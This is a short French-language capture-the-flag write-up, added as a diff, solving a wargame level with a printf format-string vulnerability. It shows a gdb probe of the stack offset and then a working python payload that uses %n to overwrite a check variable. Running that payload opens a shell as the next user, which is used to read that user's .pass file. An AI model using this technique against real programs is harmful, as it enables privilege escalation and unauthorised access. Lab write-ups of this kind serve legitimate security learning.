@@ -1,0 +1,35 @@
+main() appelle la fonction v()
+
+il y a un system("/bin/sh") dans v()
+
+il est dans un if qui compare le contenu de l'adresse 0x804988c avec 0x40 (64 en decimal)
+
+avant le compare il y a un printf qui print directement l'input recupere par fgets avant
+
+
+On va exploiter printf:
+(gdb) r
+Starting program: /home/user/level3/level3 
+notre input: AAAAAAAA %x %x %x %x %x %x %x %x %x %x %x %x 
+AAAAAAAA 200 b7fd1ac0 b7ff37d0 41414141 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
+[Inferior 1 (process 28840) exited normally]
+
+notre input est place au 4e arg de printf
+on peut modifier le contenu de l adresse de cet arg avec %n qui ecrit le nombre
+	de caracteres ecrit avant
+on veut rentrer 64 dans l adresse 0x804988c
+
+On va donc creer un payload comme cela:
+
+[adresse a modifier]
++ [64 caracteres - 4 (-4 car on a ecrit 4 caracteres juste avant, l'adresse a modifier)]
++ [%4$n], le 4$ permettant de choisir dans l adresse de quel argument ecrire, on prend le 4e car on a vu 
+	que c'est dans celui-ci qu'il y a notre adresse
+
+python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60c" + "%4$n"' > /tmp/exploit3
+
+cat /tmp/exploit3 - | ./level3
+
+>whoami
+level4
+>cat /home/user/level4/.pass
